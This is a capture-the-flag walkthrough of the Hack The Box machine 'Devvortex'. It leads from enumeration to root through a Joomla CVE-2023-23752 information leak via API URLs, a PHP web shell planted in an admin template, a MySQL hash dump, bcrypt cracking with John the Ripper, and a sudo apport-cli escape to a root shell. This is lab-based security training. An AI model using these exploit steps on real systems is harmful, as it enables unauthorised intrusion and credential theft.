# HTB: Devvortex walkthrough

![Devvortex machine pwned](https://github.com/het-desai/hackthebox/blob/main/devvortex/screenshots/boxpwned.png "Devvortex machine pwned")

## Introduction

In the course of this security assessment, an nmap scan revealed open ports 22 and 80. Further exploration through DNS brute force led to the discovery of a subdomain, which was then subjected to file discovery using gobuster. This approach granted access to the Administrator page of a vulnerable CMS, allowing us to exploit unauthorized content and gain entry to sensitive data. Armed with this information, we successfully logged into the Dashboard, uploaded a payload to establish a web shell, and delved into the mysql database. Here, we obtained a user's password hash, cracking it using the JohnTheRipper tool. Our quest for root access involved identifying sudo-accessible root programs, ultimately leading to successful privilege escalation through the apport-cli program.

## Machine enumeration

Nmap scans to find open ports on the targeted machine.

```
# Nmap 7.94SVN scan initiated Sun Feb 18 03:58:38 2024 as: nmap -sCV -o nmap/nmap.init 10.10.11.242
Nmap scan report for 10.10.11.242
Host is up (0.091s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 18 03:58:50 2024 -- 1 IP address (1 host up) scanned in 12.13 seconds
```

The Nmap output shows that port 22 and 80 are open. Add domain name to the attacker machine /etc/hosts file.

## Port 80 Enumeration

Firstly, look for subdirectories using dirb tool.

```
dirb "devvortex.htb" -o dirBrute/dirbDefault.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: dirBrute/dirbDefault.txt
START_TIME: Sun Feb 18 04:01:06 2024
URL_BASE: http://devvortex.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://devvortex.htb/ ----
==> DIRECTORY: http://devvortex.htb/css/
==> DIRECTORY: http://devvortex.htb/images/
+ http://devvortex.htb/index.html (CODE:200|SIZE:18048)
==> DIRECTORY: http://devvortex.htb/js/

---- Entering directory: http://devvortex.htb/css/ ----

---- Entering directory: http://devvortex.htb/images/ ----

---- Entering directory: http://devvortex.htb/js/ ----

-----------------
END_TIME: Sun Feb 18 04:11:40 2024
DOWNLOADED: 18448 - FOUND: 1
```

I did not find anything interesting. So I looked for HTML comments on [devvortex.htb](http://devvortex.htb/) but could not find anything interesting as well. I tried to gather information using Wappilizer (browser extension) and check CSS and JS files. I got nothing from it. Then I looked for subdomains but could not find anything using the Gobuster tool.

```
gobuster dns -d devvortex.htb -w ~/Tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     devvortex.htb
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /root/Tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
```

I was frustrated, and then I decided to seek some help. I checked a walkthrough on the internet and found that other players discovered the subdomain using the gobuster tool, but I didn't, as you can see in my above code. The second issue in the above code is that **4989 / 4990** gave a hint while I was writing this write-up. I don't know what the issue was there. I decided to focus on the challenge, so I adopted that solution and saved the subdomain into my /etc/hosts file.

**Request: If you know the issue, please let me know.**

I checked the directories and other files using the Gobuster tool.

```
gobuster dir -u http://dev.devvortex.htb -w /usr/share/wordlists/dirb/common.txt -q

/.hta                 (Status: 403) [Size: 162]
/.cache               (Status: 403) [Size: 162]
/.history             (Status: 403) [Size: 162]
/.git/HEAD            (Status: 403) [Size: 162]
/.cvsignore           (Status: 403) [Size: 162]
/.forward             (Status: 403) [Size: 162]
/.cvs                 (Status: 403) [Size: 162]
/.bash_history        (Status: 403) [Size: 162]
/.htaccess            (Status: 403) [Size: 162]
/.config              (Status: 403) [Size: 162]
/.bashrc              (Status: 403) [Size: 162]
/.htpasswd            (Status: 403) [Size: 162]
/.listing             (Status: 403) [Size: 162]
/.sh_history          (Status: 403) [Size: 162]
/.rhosts              (Status: 403) [Size: 162]
/.mysql_history       (Status: 403) [Size: 162]
/.profile             (Status: 403) [Size: 162]
/.perf                (Status: 403) [Size: 162]
/.passwd              (Status: 403) [Size: 162]
/.subversion          (Status: 403) [Size: 162]
/.svn                 (Status: 403) [Size: 162]
/.ssh                 (Status: 403) [Size: 162]
/.listings            (Status: 403) [Size: 162]
/.svn/entries         (Status: 403) [Size: 162]
/.web                 (Status: 403) [Size: 162]
/.swf                 (Status: 403) [Size: 162]
/administrator        (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/administrator/]
/api                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/api/]
/cache                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/cache/]
/components           (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/components/]
/home                 (Status: 200) [Size: 23221]
/images               (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/images/]
/includes             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/includes/]
/index.php            (Status: 200) [Size: 23221]
/language             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/language/]
/layouts              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/layouts/]
/libraries            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/libraries/]
/media                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/media/]
/modules              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/modules/]
/plugins              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/plugins/]
/robots.txt           (Status: 200) [Size: 764]
/templates            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/templates/]
/tmp                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/tmp/]
```

There are lots of useful paths. I visited the administrator page and found a Joombla login page.

![administrator login page](https://github.com/het-desai/hackthebox/blob/main/devvortex/screenshots/administratorloginpage.png "administrator login page")

I tried to look for the Joombla installed version using Wappilizer, but I didn't find it. So look for Joombla's vulnerabilities. I thought HTB machines were usually made for boot-to-root. So, I was focused on finding senstive information disclosure, or RCE, without a username and password. Eventually, I found [CVE-2023-23752](https://www.cvedetails.com/cve/CVE-2023-23752/).

## www user access

After getting that CVE-2023-23752 information, I looked for PoC tools on the internet, and I found a [github repository](https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT/blob/main/CVE-2023-23752.py). After analysing the PoC script. I came up with the below URLs for registered users and their passwords. The sensitive information was disclosed due to improper authentication mechanisms.

[Username URL](http://dev.devvortex.htb/api/index.php/v1/users?public=true)

![Usernames](https://github.com/het-desai/hackthebox/blob/main/devvortex/screenshots/username.png "Username")

[Password URL](http://dev.devvortex.htb/api/index.php/v1/config/application?public=true)

![Password](https://github.com/het-desai/hackthebox/blob/main/devvortex/screenshots/password.png "Password")

On the password page, I found a database name and a database prefix name. On the user name page, I found two usernames. I think this information might help us later. So I kept these details in my notes.

Username: lewis, logan

Password: P4ntherg0t1n5r3c0n##

Database name: Joombla

Db prefix: sd4fg_

I tried founded first username and password. I got the administrator dashboard. To get a shell over a targeted machine, I tried to upload a PHP payload on the CMS default template page. Because when I logged into the administrator's dashboard, a warning message popped up about the out-dated PHP version, and I found it on the administrator login page using Wappilizer under the Programming Language section.

![Php warning](https://github.com/het-desai/hackthebox/blob/main/devvortex/screenshots/phpwarning.png "Php warning")

Upload payload into the `Administrator Dashboard > System > Templates > Administrator Templates > Atum Details and Files > /administrator/templates/atum/ > index.php` to get a reverse web shell using netcat.

![web shell](https://github.com/het-desai/hackthebox/blob/main/devvortex/screenshots/webshell.png "web shell")

## logan user access

After getting the web shell, I revised my notes, and I know I saw the database name. So I tried my web credentials on the MySQL database.

```
www-data@devvortex:~/dev.devvortex.htb/administrator$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<tor$ python3 -c 'import pty;pty.spawn("/bin/bash")'  
www-data@devvortex:~/dev.devvortex.htb/administrator$ export TERM=xterm 
export TERM=xterm
www-data@devvortex:~/dev.devvortex.htb/administrator$ export SHELL=/bin/bash
export SHELL=/bin/bash
www-data@devvortex:~/dev.devvortex.htb/administrator$ mysql -u lewis -p
mysql -u lewis -p
Enter password: P4ntherg0t1n5r3c0n##

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 5290
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use joomla;
use joomla;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
| sd4fg_action_logs             |
| sd4fg_action_logs_extensions  |
| sd4fg_action_logs_users       |
| sd4fg_assets                  |
| sd4fg_associations            |
| sd4fg_banner_clients          |
| sd4fg_banner_tracks           |
| sd4fg_banners                 |
| sd4fg_categories              |
| sd4fg_contact_details         |
| sd4fg_content                 |
| sd4fg_content_frontpage       |
| sd4fg_content_rating          |
| sd4fg_content_types           |
| sd4fg_contentitem_tag_map     |
| sd4fg_extensions              |
| sd4fg_fields                  |
| sd4fg_fields_categories       |
| sd4fg_fields_groups           |
| sd4fg_fields_values           |
| sd4fg_finder_filters          |
| sd4fg_finder_links            |
| sd4fg_finder_links_terms      |
| sd4fg_finder_logging          |
| sd4fg_finder_taxonomy         |
| sd4fg_finder_taxonomy_map     |
| sd4fg_finder_terms            |
| sd4fg_finder_terms_common     |
| sd4fg_finder_tokens           |
| sd4fg_finder_tokens_aggregate |
| sd4fg_finder_types            |
| sd4fg_history                 |
| sd4fg_languages               |
| sd4fg_mail_templates          |
| sd4fg_menu                    |
| sd4fg_menu_types              |
| sd4fg_messages                |
| sd4fg_messages_cfg            |
| sd4fg_modules                 |
| sd4fg_modules_menu            |
| sd4fg_newsfeeds               |
| sd4fg_overrider               |
| sd4fg_postinstall_messages    |
| sd4fg_privacy_consents        |
| sd4fg_privacy_requests        |
| sd4fg_redirect_links          |
| sd4fg_scheduler_tasks         |
| sd4fg_schemas                 |
| sd4fg_session                 |
| sd4fg_tags                    |
| sd4fg_template_overrides      |
| sd4fg_template_styles         |
| sd4fg_ucm_base                |
| sd4fg_ucm_content             |
| sd4fg_update_sites            |
| sd4fg_update_sites_extensions |
| sd4fg_updates                 |
| sd4fg_user_keys               |
| sd4fg_user_mfa                |
| sd4fg_user_notes              |
| sd4fg_user_profiles           |
| sd4fg_user_usergroup_map      |
| sd4fg_usergroups              |
| sd4fg_users                   |
| sd4fg_viewlevels              |
| sd4fg_webauthn_credentials    |
| sd4fg_workflow_associations   |
| sd4fg_workflow_stages         |
| sd4fg_workflow_transitions    |
| sd4fg_workflows               |
+-------------------------------+
71 rows in set (0.00 sec)

mysql> select username,password from sd4fg_users;
select username,password from sd4fg_users;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+----------+--------------------------------------------------------------+
2 rows in set (0.00 sec)

mysql> 
```

I found logan username and password hash from the mysql database.

Username: logan

Hash: $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12

I stored the logan user's hash into the loganHash.txt file and tried to crack it using JohnTheRipper.

```
john --wordlist=/root/Tools/SecLists/Passwords/Leaked-Databases/rockyou.txt loganHash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (?)     
1g 0:00:00:37 DONE (2024-02-18 13:57) 0.02660g/s 37.35p/s 37.35c/s 37.35C/s lacoste..harry
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

I finally found a user account password. Log in using the ssh service and get a user flag.

![user flag](https://github.com/het-desai/hackthebox/blob/main/devvortex/screenshots/userflag.png "user flag")

## Privilege Escalation

Now, it's time for privilege escalation. My first companion gives me interesting information.

```
logan@devvortex:~$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

I searched the internet regarding this tool vulnerability and found this [sudo apport-cli exploit](https://dcs3c.medium.com/cve-2023-1326-poc-c8f2a59d0e00).

I followed the below steps to get the root shell.

Step 1:

`sudo apport-cli --file-bug`

Step 2: As per the above-mentioned article, I can select any option to proceed further, but I selected **1**, and after I selected **2**, I pressed any key to move forward.

![Select option 1](https://github.com/het-desai/hackthebox/blob/main/devvortex/screenshots/option1.png "Select option 1")

![Select option 2](https://github.com/het-desai/hackthebox/blob/main/devvortex/screenshots/option2.png "Select option 2")

Step 3: Select the View point

![Select view point](https://github.com/het-desai/hackthebox/blob/main/devvortex/screenshots/optionv.png "Select view point")

In the view report, type the below command to get a root shell.

`!/bin/bash`

![bash payload](https://github.com/het-desai/hackthebox/blob/main/devvortex/screenshots/bashpayload.png "bash payload")

![root flag](https://github.com/het-desai/hackthebox/blob/main/devvortex/screenshots/rootflag.png "root flag")